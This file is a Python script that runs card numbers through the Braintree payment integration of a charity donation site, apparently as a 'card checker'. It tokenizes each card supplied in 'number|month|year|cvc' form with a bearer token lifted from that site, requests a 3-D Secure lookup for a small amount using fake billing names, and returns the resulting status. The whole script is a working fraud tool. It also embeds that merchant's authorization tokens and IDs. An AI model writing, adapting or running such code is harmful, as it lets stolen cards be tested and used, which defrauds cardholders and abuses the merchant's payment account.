from bs4 import BeautifulSoup
import requests,re
import time
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	time.sleep(7)	
#	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk0Nzg3MTYsImp0aSI6IjZiM2MzM2U5LTM2ODYtNDBiMy05ZTFiLTk5NjU0NTZmYzhlOCIsInN1YiI6IjVrODZ6aHZwazR3ZGQ3cm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjVrODZ6aHZwazR3ZGQ3cm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.T5IhrYj_7YPj9fYyK1ZL_KTNevW3tDObskCSiXOugA3y45onMvdIyVNPNbdfbhq9Iuz0ya8Vy87ioi7NVB-mFQ',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '50199e46-dfb7-499d-9d95-824abcd98086',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'jyfhyff',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	import requests
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://friendsoftheearth.uk',
	    'referer': 'https://friendsoftheearth.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '2',
	    'additionalInfo': {
	        'billingPostalCode': 'B2 4PE',
	        'billingPhoneNumber': '8313853889',
	        'billingGivenName': 'hygh',
	        'billingSurname': 'h ut gg jj',
	        'email': 'day474648@gmail.com',
	    },
	    'challengeRequested': True,
	    'bin': '531367',
	    'dfReferenceId': '1_52b81724-baf2-4c89-86c4-ba6d464d2032',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.88.1',
	        'cardinalDeviceDataCollectionTimeElapsed': 371,
	        'issuerDeviceDataCollectionTimeElapsed': 5643,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk0ODIwOTIsImp0aSI6IjgxMDZkYmYyLTUwMjAtNDFjZC04NDVkLWI1OTY4ZWYwMzFiNCIsInN1YiI6IjVrODZ6aHZwazR3ZGQ3cm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjVrODZ6aHZwazR3ZGQ3cm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.1qR8BKoX-nMmAwjC59eop7ABNVBulaFECgeRjItGE_82gor1wUDcMGfTIcpumONvvnccKLTIIQwUOT4kOrfeyQ',
	    'braintreeLibraryVersion': 'braintree/web/3.88.1',
	    '_meta': {
	        'merchantAppId': 'friendsoftheearth.uk',
	        'platform': 'web',
	        'sdkVersion': '3.88.1',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'd430ad09-a8f0-470a-aa83-ddd28a28af74',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/5k86zhvpk4wdd7rn/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"amount":"2","additionalInfo":{"billingPostalCode":"B2 4PE","billingPhoneNumber":"8313853889","billingGivenName":"hygh","billingSurname":"h ut gg jj","email":"day474648@gmail.com"},"challengeRequested":true,"bin":"531367","dfReferenceId":"1_52b81724-baf2-4c89-86c4-ba6d464d2032","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.88.1","cardinalDeviceDataCollectionTimeElapsed":371,"issuerDeviceDataCollectionTimeElapsed":5643,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk0ODIwOTIsImp0aSI6IjgxMDZkYmYyLTUwMjAtNDFjZC04NDVkLWI1OTY4ZWYwMzFiNCIsInN1YiI6IjVrODZ6aHZwazR3ZGQ3cm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjVrODZ6aHZwazR3ZGQ3cm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.1qR8BKoX-nMmAwjC59eop7ABNVBulaFECgeRjItGE_82gor1wUDcMGfTIcpumONvvnccKLTIIQwUOT4kOrfeyQ","braintreeLibraryVersion":"braintree/web/3.88.1","_meta":{"merchantAppId":"friendsoftheearth.uk","platform":"web","sdkVersion":"3.88.1","source":"client","integration":"custom","integrationType":"custom","sessionId":"d430ad09-a8f0-470a-aa83-ddd28a28af74"}}'
	#response = requests.post(
	#    'https://api.braintreegateway.com/merchants/5k86zhvpk4wdd7rn/client_api/v1/payment_methods/tokencc_bh_zp472d_n8qxcp_2s2ywq_mqbqgq_6m3/three_d_secure/lookup',
	#    headers=headers,
	#    data=data,
	#)
	
	data = response.json()
	try:
		return data['paymentMethod']['threeDSecureInfo']['status']
	except:
 		print(response.text)
	